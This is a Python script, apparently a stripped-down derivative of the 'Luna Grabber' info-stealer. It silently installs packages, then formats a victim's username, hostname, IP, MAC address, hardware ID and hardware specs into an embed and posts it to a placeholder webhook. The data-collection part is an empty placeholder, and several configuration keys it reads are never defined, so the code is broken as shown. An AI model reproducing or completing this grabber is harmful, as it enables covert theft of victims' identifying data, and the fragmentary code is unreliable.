import subprocess
import sys

# Ensure required modules are installed
def ensure_pip():
    try:
        import pip
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'ensurepip', '--upgrade'])

def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        ensure_pip()  # Ensure pip is available
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name])

def install_required_modules():
    required_modules = [
        "psutil",
        "wmi",
        "GPUtil"
    ]
    for module in required_modules:
        install_module(module)

# Install required modules
install_required_modules()

import socket
import platform
import psutil
import GPUtil
import uuid
import os
import re
import requests
import wmi

BUILDERVALUES = {
    "webhook": "YOUR_WEBHOOK_URL",
    # Your other configuration settings here...
}

def main():
    if BUILDERVALUES["systeminfo"] == True:
        systeminfo()

def systeminfo():
    systeminfoarray = {
        # Your system information gathering code here...
    }
    
    data = {
        "embeds": [
            {
                "title": BUILDERVALUES["botname"],
                "color": 5639644,
                "fields": [{
                    "name": "System Info",
                    "value": f'''💻 **PC Username:** `{systeminfoarray["username"]}`\n:desktop: **PC Name:** `{systeminfoarray["hostname"]}`\n🌐 **OS:** `{systeminfoarray["computer_os"]}`\n\n👀 **IP:** `{systeminfoarray["ip"]}`\n🍏 **MAC:** `{systeminfoarray["mac"]}`\n🔧 **HWID:** `{systeminfoarray["hwid"]}`\n\n<:cpu:1051512676947349525> **CPU:** `{systeminfoarray["cpu"]}`\n<:gpu:1051512654591688815> **GPU:** `{systeminfoarray["gpu"]}`\n<:ram1:1051518404181368972> **RAM:** `{systeminfoarray["ram"]}GB`'''
                }],
                "footer": {
                    "text": "Scamming Scammers | Created By Plazaify, Based of of Luna Grabber (Made by smug)"
                },
                "thumbnail": {
                    "url": BUILDERVALUES["icon"]
                }
            }
        ],
        "username": BUILDERVALUES["botname"],
        "avatar_url": BUILDERVALUES["icon"]
    }
    
    requests.post(BUILDERVALUES["webhook"], json=data)

main()
